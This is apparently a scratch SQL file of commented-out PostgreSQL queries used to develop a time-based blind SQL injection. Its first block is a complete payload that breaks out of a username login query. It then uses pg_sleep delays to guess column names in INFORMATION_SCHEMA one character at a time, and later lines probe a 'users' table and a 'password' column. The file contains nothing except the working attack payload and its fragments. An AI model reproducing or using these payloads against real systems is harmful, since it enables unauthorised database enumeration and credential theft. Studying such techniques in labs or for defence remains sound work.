-- SELECT * FROM users WHERE username = '' AND (SELECT CASE WHEN EXISTS 
-- 	(SELECT 1 FROM (SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_CATALOG = 'phuc' 
-- 	AND TABLE_SCHEMA NOT IN ('information_schema', 'pg_catalog') AND table_name = 'conca' 
-- 	AND COLUMN_NAME NOT IN ('id', 'name') LIMIT 1)
-- 	WHERE SUBSTRING(COLUMN_NAME,1,1) = 't'
-- 	) THEN pg_sleep(0.5)
-- 	ELSE NULL
-- 	END) IS NULL;-- -

-- SELECT 1 FROM (SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_CATALOG = 'phuc' 
-- 	AND TABLE_SCHEMA NOT IN ('information_schema', 'pg_catalog') AND table_name = 'users' 
-- 	AND COLUMN_NAME NOT IN ('id', 'username') LIMIT 1)
-- 	WHERE SUBSTRING(COLUMN_NAME,1,1) = 't'

-- SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_CATALOG='phuc' 
-- 	AND TABLE_SCHEMA NOT IN ('information_schema', 'pg_catalog') AND table_name = 'users' 
-- 	AND COLUMN_NAME NOT IN ('id', 'username') LIMIT 1

-- SELECT 1 FROM (SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME = 'password')
-- WHERE SUBSTRING (COLUMN_NAME,1,1) = 'p'


-- SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME = 'password'